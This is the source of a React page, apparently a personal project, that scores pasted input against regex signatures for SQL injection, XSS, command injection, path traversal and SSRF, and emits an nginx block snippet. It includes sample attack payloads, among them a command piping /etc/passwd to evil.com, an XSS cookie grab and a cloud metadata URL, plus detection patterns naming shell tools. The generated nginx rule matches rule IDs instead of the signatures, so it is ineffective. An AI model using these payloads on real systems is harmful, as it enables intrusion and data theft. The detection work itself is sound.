"use client";

import { useState, useMemo } from "react";
import Navbar from "@/components/Navbar";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";

interface SignatureRule {
  id: string;
  category: "SQL Injection (SQLi)" | "Cross-Site Scripting (XSS)" | "Command Injection (RCE)" | "Path Traversal (LFI)" | "SSRF / Protocol Abuse";
  pattern: RegExp;
  severity: "CRITICAL" | "HIGH" | "MEDIUM";
  score: number;
  description: string;
}

const WAF_RULES: SignatureRule[] = [
  {
    id: "RULE-942100",
    category: "SQL Injection (SQLi)",
    pattern: /(\b(union(\s+all)?\s+select|select.*from|insert\s+into|delete\s+from|drop\s+(table|database)|information_schema)\b|--|\/\*|\*\/|'\s*(or|and)\s*'?\w+'?\s*=\s*'?\w+)/i,
    severity: "CRITICAL",
    score: 40,
    description: "Detects classic SQL syntax manipulation, UNION selects, and authentication bypass boolean logic.",
  },
  {
    id: "RULE-941100",
    category: "Cross-Site Scripting (XSS)",
    pattern: /(<script[\s\S]*?>[\s\S]*?<\/script>|javascript:[^\n]*|onerror\s*=|onload\s*=|document\.(cookie|location)|<img[^>]+src=[^>]+>|<svg[\s\S]*?onload=)/i,
    severity: "CRITICAL",
    score: 35,
    description: "Detects malicious DOM execution, inline JavaScript event handlers, and script tag injections.",
  },
  {
    id: "RULE-932100",
    category: "Command Injection (RCE)",
    pattern: /(;\s*(cat|ls|whoami|id|uname|curl|wget|bash|sh|nc|ncat|netcat|powershell)\b|`[^`]+`|\$\([^)]+\)|\|\s*(cat|sh|bash|curl|wget))/i,
    severity: "CRITICAL",
    score: 45,
    description: "Detects shell chaining operators, command execution backticks, and subshell invocation patterns.",
  },
  {
    id: "RULE-930100",
    category: "Path Traversal (LFI)",
    pattern: /(\.\.\/|\.\.\\|%2e%2e%2f|%2e%2e\/|\/etc\/(passwd|shadow|hosts)|c:\\windows\\system32)/i,
    severity: "HIGH",
    score: 30,
    description: "Detects directory climbing sequences and sensitive system configuration file paths.",
  },
  {
    id: "RULE-934100",
    category: "SSRF / Protocol Abuse",
    pattern: /(http:\/\/(127\.0\.0\.1|localhost|0\.0\.0\.0|169\.254\.169\.254)|file:\/\/|gopher:\/\/|dict:\/\/)/i,
    severity: "HIGH",
    score: 25,
    description: "Detects loopback address targeting, AWS cloud metadata extraction, and arbitrary URI scheme abuse.",
  },
];

export default function WafInspectorPage() {
  const [payload, setPayload] = useState("admin' UNION SELECT 1, @@version, user() --");
  const [copied, setCopied] = useState(false);

  const samplePayloads = [
    { label: "SQLi Bypass", text: "' OR '1'='1' --" },
    { label: "XSS Stager", text: `<img src=x onerror="alert(document.cookie)">` },
    { label: "RCE Injection", text: "127.0.0.1; cat /etc/passwd | curl http://evil.com" },
    { label: "LFI Traversal", text: "../../../../etc/shadow" },
    { label: "SSRF AWS Meta", text: "http://169.254.169.254/latest/meta-data/" },
    { label: "Benign Text", text: "Hello, I want to discuss a new software engineering project." },
  ];

  // Real-time evaluation
  const analysis = useMemo(() => {
    if (!payload.trim()) {
      return { totalScore: 0, matches: [], level: "CLEAN", statusColor: "text-slate-400" };
    }

    const matchedRules: { rule: SignatureRule; matchedStr: string }[] = [];
    let totalScore = 0;

    for (const rule of WAF_RULES) {
      const match = payload.match(rule.pattern);
      if (match) {
        matchedRules.push({
          rule,
          matchedStr: match[0],
        });
        totalScore += rule.score;
      }
    }

    const clampedScore = Math.min(totalScore, 100);

    let level = "CLEAN / BENIGN";
    let statusColor = "text-emerald-400";
    if (clampedScore >= 70) {
      level = "CRITICAL THREAT";
      statusColor = "text-red-400";
    } else if (clampedScore >= 35) {
      level = "HIGH RISK";
      statusColor = "text-amber-400";
    } else if (clampedScore > 0) {
      level = "SUSPICIOUS / LOW";
      statusColor = "text-yellow-300";
    }

    return { totalScore: clampedScore, matches: matchedRules, level, statusColor };
  }, [payload]);

  const generateNginxRule = () => {
    if (analysis.matches.length === 0) return "# No threats detected in current payload string.";
    const patterns = analysis.matches.map((m) => m.rule.id).join("|");
    return `# NGINX WAF Block Snippet\nif ($request_uri ~* "(${patterns})") {\n    return 403 "Blocked by Aryan WAF Engine";\n}`;
  };

  const copyRule = () => {
    navigator.clipboard.writeText(generateNginxRule());
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col justify-between selection:bg-indigo-500 selection:text-white font-sans">
      <Navbar />

      <main className="max-w-5xl mx-auto px-4 py-10 w-full space-y-8">
        
        {/* Title Header */}
        <div className="space-y-2">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full border border-indigo-500/30 bg-indigo-500/10 text-indigo-400 text-xs font-semibold">
            🛡️ Deep Packet & Payload Inspection
          </div>
          <h1 className="text-3xl sm:text-4xl font-extrabold text-white tracking-tight">
            WAF Rule & Threat Vector Evaluator
          </h1>
          <p className="text-slate-400 text-sm max-w-2xl leading-relaxed">
            Client-side deterministic evaluation against OWASP Core Rule Set (CRS) regular expressions with automated defensive mitigation rule generation.
          </p>
        </div>

        {/* Input Card */}
        <Card className="bg-slate-900/60 border-slate-800 shadow-2xl">
          <CardHeader className="pb-3">
            <CardTitle className="text-sm text-slate-300 font-semibold uppercase">Inspection Target Stream</CardTitle>
            <CardDescription className="text-xs text-slate-400">
              Input HTTP request parameters, raw queries, or form payloads
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <textarea
              rows={3}
              value={payload}
              onChange={(e) => setPayload(e.target.value)}
              placeholder="Paste raw request payload or SQL/XSS/RCE test string..."
              className="w-full bg-slate-950 border border-slate-800 rounded-lg p-3 text-xs text-indigo-300 font-mono focus:outline-none focus:border-indigo-500 resize-none leading-relaxed"
            />

            {/* Quick Payload Preset Chips */}
            <div className="flex flex-wrap items-center gap-2 text-xs">
              <span className="text-slate-500">Exploit Presets:</span>
              {samplePayloads.map((s, idx) => (
                <button
                  key={idx}
                  onClick={() => setPayload(s.text)}
                  className="px-2.5 py-1 rounded-md bg-slate-950 border border-slate-800 hover:border-indigo-500/50 text-slate-300 hover:text-white transition font-mono text-[11px]"
                >
                  {s.label}
                </button>
              ))}
            </div>
          </CardContent>
        </Card>

        {/* Real-time Threat Assessment Banner */}
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 font-mono text-xs">
          <Card className="bg-slate-900/60 border-slate-800">
            <CardHeader className="p-4 pb-2">
              <CardDescription className="text-slate-400 font-sans uppercase font-semibold">Threat Level</CardDescription>
              <CardTitle className={`text-xl font-bold mt-1 ${analysis.statusColor}`}>
                {analysis.level}
              </CardTitle>
            </CardHeader>
          </Card>

          <Card className="bg-slate-900/60 border-slate-800">
            <CardHeader className="p-4 pb-2">
              <CardDescription className="text-slate-400 font-sans uppercase font-semibold">Calculated Threat Score</CardDescription>
              <CardTitle className="text-xl font-bold text-white mt-1">
                {analysis.totalScore} / 100
              </CardTitle>
            </CardHeader>
          </Card>

          <Card className="bg-slate-900/60 border-slate-800">
            <CardHeader className="p-4 pb-2">
              <CardDescription className="text-slate-400 font-sans uppercase font-semibold">Triggered Rules</CardDescription>
              <CardTitle className="text-xl font-bold text-indigo-400 mt-1">
                {analysis.matches.length} Rule(s)
              </CardTitle>
            </CardHeader>
          </Card>
        </div>

        {/* Triggered Rule Breakdowns */}
        <div className="space-y-4">
          <h2 className="text-base font-bold text-white tracking-tight">
            Triggered Signature Breakdown
          </h2>

          {analysis.matches.length === 0 ? (
            <div className="p-6 rounded-xl border border-dashed border-slate-800 bg-slate-950/50 text-center text-slate-500 text-xs font-mono">
              ✓ Clean payload stream. No known OWASP attack signatures matched.
            </div>
          ) : (
            <div className="grid grid-cols-1 gap-3">
              {analysis.matches.map((item, i) => (
                <Card key={i} className="bg-slate-900/60 border-red-500/30">
                  <CardHeader className="p-4 pb-2 flex flex-row items-center justify-between">
                    <div className="flex items-center gap-2">
                      <span className="px-2 py-0.5 rounded bg-red-500/20 text-red-400 font-mono font-bold text-[11px] border border-red-500/30">
                        {item.rule.id}
                      </span>
                      <span className="text-xs font-bold text-white">{item.rule.category}</span>
                    </div>
                    <span className="text-[11px] font-mono text-red-400 font-semibold">
                      +{item.rule.score} PTS [{item.rule.severity}]
                    </span>
                  </CardHeader>
                  <CardContent className="p-4 pt-1 space-y-2">
                    <p className="text-xs text-slate-400">{item.rule.description}</p>
                    <div className="p-2 rounded bg-slate-950 border border-slate-800 font-mono text-xs text-red-300 break-all">
                      <span className="text-slate-500">Matched Vector: </span>
                      {item.matchedStr}
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          )}
        </div>

        {/* Automated Defensive Mitigation Snippet */}
        <Card className="bg-slate-900/60 border-slate-800 font-mono text-xs overflow-hidden">
          <CardHeader className="p-4 bg-slate-950/60 border-b border-slate-800 flex flex-row items-center justify-between">
            <CardTitle className="text-xs text-slate-300 uppercase font-bold">Auto-Generated WAF Mitigation Rule</CardTitle>
            <Button
              onClick={copyRule}
              size="sm"
              variant="outline"
              className="border-slate-800 bg-slate-900 hover:bg-slate-800 text-[11px] h-7 text-slate-300"
            >
              {copied ? "✓ Copied Rule" : "Copy Snippet"}
            </Button>
          </CardHeader>
          <CardContent className="p-4">
            <pre className="bg-slate-950 p-4 rounded-lg border border-slate-800 text-indigo-300 overflow-x-auto whitespace-pre-wrap leading-relaxed">
              {generateNginxRule()}
            </pre>
          </CardContent>
        </Card>

      </main>

      <footer className="border-t border-slate-800/80 py-6 text-center text-xs text-slate-500">
        <p>© 2026 Aryan Tomar. OWASP CRS Signature Engine.</p>
      </footer>
    </div>
  );
}
